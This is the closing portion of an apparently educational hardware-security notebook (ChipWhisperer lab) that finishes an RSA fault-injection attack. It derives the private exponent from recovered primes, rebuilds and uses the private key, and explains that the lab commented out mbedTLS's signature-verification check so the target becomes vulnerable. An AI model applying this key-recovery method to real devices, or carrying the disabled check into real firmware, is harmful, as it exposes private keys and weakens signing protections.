   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0x24bf6185468786fdd303083d25e64efc66ca472bc44d253102f8b4a9d3bfa75091386c0077937fe33fa3252d28855837ae1b484a8a9a45f7ee8c0c634f99e8cddf79c5ce07ee72c7f123142198164234cabb724cf78b8173b9f880fc86322407af1fedfdde2beb674ca15f3e81a1521e071513a1e85b5dfa031f21ecae91a34d\n"
     ]
    }
   ],
   "source": [
    "phi = (q_test - 1)*(p_test - 1)\n",
    "def egcd(a, b):\n",
    "    x,y, u,v = 0,1, 1,0\n",
    "    while a != 0:\n",
    "        q, r = b//a, b%a\n",
    "        m, n = x-u*q, y-v*q\n",
    "        b,a, x,y, u,v = a,r, u,v, m,n\n",
    "        gcd = b\n",
    "    return gcd, x, y\n",
    "\n",
    "gcd, d, b = egcd(e, phi)\n",
    "\n",
    "print(hex(d))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's sign the original message and see if we can verify it with our original verifier:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "bytearray(b\"8J\\xf4\\x91}\\x1d!\\xe1\\x8e\\x86L|w\\x8f\\x8d8\\x03t\\x80l\\xc6\\xfc|\\xf7\\x89O\\xb4\\x0e\\xc4\\x0f\\x13\\xec\\\\*\\'g\\x85\\xf1g%\\xcd}e\\x1d\\rc\\x99hb\\x0f`Rfax)\\xd6\\xcc2,\\x95\\x85h-\\xe5(CG0\\xa7kc\\x9c.\\r\\x85+,\\xab\\xd7\\xc2\\x7fZ\\x19\\x1c\\xfaq\\xb9\\xb6\\xe7N\\x91\\xa1\\x06z\\xc2\\x88 o\\x97\\xf5y\\xca\\xd3\\x96\\xb9o|+R\\x88\\xf4,\\xd0\\x07\\xe0\\x180H\\xec\\xd1\\xf2\\x97:QF(\\xf1\")\n",
      "True\n"
     ]
    }
   ],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Signature import PKCS1_v1_5 \n",
    "\n",
    "from Crypto.Hash import SHA256\n",
    "\n",
    "private_key = RSA.construct((n, e, int(d), int(p_test), int(q_test)))\n",
    "private_signer = PKCS1_v1_5.new(private_key) \n",
    "new_sig = private_signer.sign(hash_object)\n",
    "print(sig)\n",
    "\n",
    "new_sig_check = signer.verify(hash_object, new_sig)\n",
    "print(new_sig_check)\n",
    "\n",
    "assert new_sig_check, \"Failed to verify signature on device. Got: {}\".format(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that you've seen the attack work, you might want to try doing the fault in the other half of the RSA calculation to see if you can get the other prime number back."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Caveats to the Attack\n",
    "\n",
    "The crypto implementation we're attack isn't actually vulnerable to this attack without some additional glitching. This is because it verifies the signature is valid before sending it off. With a more complicated glitch setup, we could try glitching past it, but this is outside the scope of this lab. Some ideas include modifying the ChipWhisperer FPGA code to generate a second glitch, using a second ChipWhisperer (easiest if you were voltage glitching), and using a second trigger and trying to rearm between the two signature encryptions. You might even be able to increase the repeat and glitch near the end of the second encryption algorithm to glitch past both.\n",
    "\n",
    "Instead though, we copied some of the functions and commented out the following signature check:\n",
    "\n",
    "```C\n",
    "    /* Compare in constant time just in case */\n",
    "    for( diff = 0, i = 0; i < ctx->len; i++ )\n",
    "        diff |= verif[i] ^ sig[i];\n",
    "    diff_no_optimize = diff;\n",
    "\n",
    "    if( diff_no_optimize != 0 )\n",
    "    {\n",
    "        ret = MBEDTLS_ERR_RSA_PRIVATE_FAILED;\n",
    "        goto cleanup;\n",
    "    }\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
